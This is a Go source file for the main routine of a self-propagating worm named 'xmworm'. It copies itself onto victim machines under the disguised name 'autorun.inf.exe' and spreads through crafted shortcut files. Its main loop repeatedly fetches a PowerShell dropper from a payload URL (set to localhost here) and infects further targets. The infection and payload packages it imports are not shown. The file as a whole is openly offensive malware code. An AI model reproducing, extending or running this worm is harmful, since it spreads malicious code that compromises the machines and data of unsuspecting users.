package main

import (
	"github.com/0/xmworm/infect"
	"github.com/0/xmworm/install"
	"github.com/0/xmworm/payload"
	"os"
	//"math/rand"
	"time"
)

type Worm struct {
	exePathName string
	binaryName string
	maxScanInterval int
	payloadURL string
}

// Initializes a new worm
func (w *Worm) Init() {
	exePathName,  err := os.Executable() 
	if err != nil {
		panic(err)
	}
	w.exePathName = exePathName
}

func (w Worm) Infect() {
	// needs the worm, structure in order to workout
	// where the worm binary is currently located
	infect.Infect(w.exePathName)
}

func (w Worm) Install(legitFile string) {
	// needs the worm structure, in order to know the name the worm
	// binary should take when been copied around
	// need also the worm structure in order to get the current path from
	// which the running worm instance is executed (the drive full path)
	// so that we can copy it to the victim pc.
	install.Install(w.exePathName, w.binaryName, legitFile)
}

func (w Worm) Payload() {
	payload.Payload(w.payloadURL)
}

func (w Worm) Sleep() {
	//time.Sleep(time.Duration(rand.Intn(w.maxScanInterval)) * time.Millisecond)
	time.Sleep(5 * time.Second)
}

func main(){
	
	worm := &Worm{
		binaryName: "autorun.inf.exe", 
		maxScanInterval: 5,
		payloadURL: "http://localhost:8005/dropper.ps1",
	}
	worm.Init()

	// Here the worm is called with 2 arguments,
	// this can only be possible if the worm was run from an already
	// existing custom lnk file.
	if len(os.Args) == 2 {
		worm.Payload()
		worm.Install(os.Args[1])
	} else {

		// here the worm was more probably run from startup folder or manually
		// by someone
		// go worm.Payload(); maybe the payload should just handle its intricases
		// the worm need not really be aware of what the payload does internally	
		for {
			worm.Payload()
			worm.Infect()
			worm.Sleep()
		}
	}
}